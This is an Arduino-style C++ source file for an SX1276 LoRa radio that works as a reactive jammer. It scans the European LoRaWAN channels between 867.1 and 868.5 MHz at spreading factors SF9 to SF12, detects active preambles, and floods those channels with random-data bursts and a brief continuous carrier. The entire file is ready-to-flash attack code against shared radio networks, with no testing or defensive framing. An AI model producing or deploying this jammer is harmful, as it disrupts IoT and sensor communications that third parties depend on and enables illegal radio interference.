#include <RadioLib.h>

#define LORA_SCK 05
#define LORA_MISO 19
#define LORA_MOSI 27
#define LORA_SS 18
#define LORA_DIO0 26
#define LORA_DIO1 33
#define LORA_RST 14

#define DEFAULT_JAMMING 0
#define DYNAMIC_JAMMING 1

#define JAMMING_STRATEGY DEFAULT_JAMMING

// Enhanced jammer with better coverage
float frequencies[] = {867.1, 867.3, 867.5, 867.7, 867.9, 868.1, 868.3, 868.5}; // All european channels
int currentFreqIndex = 0;
int spreadingFactors[] = {9, 10, 11, 12}; // Ignore 7 and 8
int currentSFIndex = 0;

SX1276 radio = new Module(LORA_SS, LORA_DIO0, LORA_RST, LORA_DIO1);

void setup()
{
  Serial.begin(115200);
  delay(2000);

  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_SS);
  SPI.setFrequency(1000000); // 1 MHz SPI speed

  int state = radio.begin();
  if (state != RADIOLIB_ERR_NONE)
  {
    Serial.println("Radio initialization failed!");
    while (true)
      ;
  }

  // Configure radio parameters to match RN2483 defaults
  radio.setPreambleLength(8);
  radio.setOutputPower(17);
  radio.setBandwidth(125.0); // 125 kHz bandwidth
  radio.setCodingRate(5);    // 4/5 coding rate
  radio.setSyncWord(34);     // LoRaWAN public sync word
  radio.setGain(1);

  Serial.println("Enhanced LoRa Jammer Started");
  Serial.println("Frequencies: 867.1-868.5 MHz");
  Serial.println("Spreading Factors: SF9-SF12");
}

void loop()
{
  // Set current frequency and SF
  float currentFreq = frequencies[currentFreqIndex];
  int currentSF = spreadingFactors[currentSFIndex];

  radio.setFrequency(currentFreq);
  radio.setSpreadingFactor(currentSF);

  // Perform channel activity detection first
  bool channelActive = false;

  // Quick listen before jamming
  int listenResult = radio.scanChannel();
  if (listenResult == RADIOLIB_PREAMBLE_DETECTED)
  {
    channelActive = true;
    Serial.print("Activity detected on ");
    Serial.print(currentFreq);
    Serial.print(" MHz, SF");
    Serial.println(currentSF);
  }

  // Jam the channel if active
  if (channelActive)
  {
    Serial.print("Jamming ");
    Serial.print(currentFreq);
    Serial.print(" MHz, SF");
    Serial.print(currentSF);
    Serial.println();

    // Create interference patterns
    for (int burst = 0; burst < 3; burst++)
    {
      // Send continuous jamming packets
      byte jammingPayload[60];

      // Pattern 1: Random data
      for (int i = 0; i < 60; i++)
      {
        jammingPayload[i] = random(0, 255);
      }

      int result = radio.transmit(jammingPayload, 60);
      if (result == RADIOLIB_ERR_NONE)
      {
        Serial.print("Jam burst ");
        Serial.print(burst + 1);
        Serial.println(" sent");
      }

      delay(random(50, 200)); // Variable delay between bursts
    }

    // Pattern 2: Continuous carrier (brief)
    radio.transmitDirect();
    delay(100);
    radio.standby();

    Serial.println("Jamming burst complete");
    delay(random(100, 500));
  }

  // Move to next frequency/SF combination
  currentFreqIndex = (currentFreqIndex + 1) % (sizeof(frequencies) / sizeof(frequencies[0]));

  if (currentFreqIndex == 0 && JAMMING_STRATEGY == DYNAMIC_JAMMING)
  {
    currentSFIndex = (currentSFIndex + 1) % (sizeof(spreadingFactors) / sizeof(spreadingFactors[0]));
  }

  // Random timing to be unpredictable (however may be less effective)
  // delay(random(200, 800));
}